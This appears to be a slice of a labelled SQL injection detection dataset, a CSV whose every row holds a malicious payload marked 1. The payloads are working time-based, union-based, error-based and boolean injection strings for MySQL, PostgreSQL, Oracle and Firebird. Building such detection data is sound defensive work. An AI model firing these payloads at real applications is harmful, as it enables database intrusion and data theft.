row_index,payload_norm,label,sqli_type_hint
8880,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ""poik"" = ""poik",1,
8881,-1579%' ) ) ) union all select 7272#,1,
8882,1' in boolean mode ) and 9198 = 9198--,1,
8883,"1"" ) as piwi where 2918 = 2918",1,
8884,"1%"" ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( ""%"" = """,1,
8885,"-8869"" where 3019 = 3019 union all select 3019,3019,3019#",1,
8886,1 ) where 4653 = 4653 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --,1,
8887,"-4876"" ) ) as saug where 2256 = 2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",1,
8888,"1%"" ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ""%"" = """,1,
8889,"1 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
8890,"1%' ) ) and elt ( 4483 = 5364,5364 ) and ( ( '%' = '",1,
8891,"-7271' ) ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ( 'mdtw' = 'mdtw",1,
8892,1 ) ) as efjb where 4642 = 4642 order by 1#,1,
8893,"-8677'|| ( select 'ihpm' from dual where 9571 = 9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",1,
8894,1' ) where 2840 = 2840,1,
8895,1'|| ( select 'yyil' from dual where 3121 = 3121,1,
8896,"1 ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 5137 = 5137",1,
8897,"1%"" ) ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
8898,"1"" ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ""kvpy"" = ""kvpy",1,
8899,"-4932%"" ) ) or ( 3076 = 5927 ) *5927 and ( ( ""%"" = """,1,
8900,"1' or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'nelb' = 'nelb",1,
8901,1'|| ( select 'vdeo' where 4355 = 4355,1,
8902,1' in boolean mode ) and 3787 = 7750--,1,
8903,"-2790%"" ) union all select 5070,5070#",1,
8904,1'|| ( select 'vpuh' where 8164 = 8164,1,
8905,-5062 ) where 7457 = 7457 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,1,
8906,1' ) and 2564 = 3234--,1,
8907,"1"" ) as firv where 4522 = 4522 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
8908,1'|| ( select 'lkmh' where 7659 = 7659,1,
8909,"1' ) where 3476 = 3476 and elt ( 1210 = 1210,sleep ( 5 ) ) --",1,
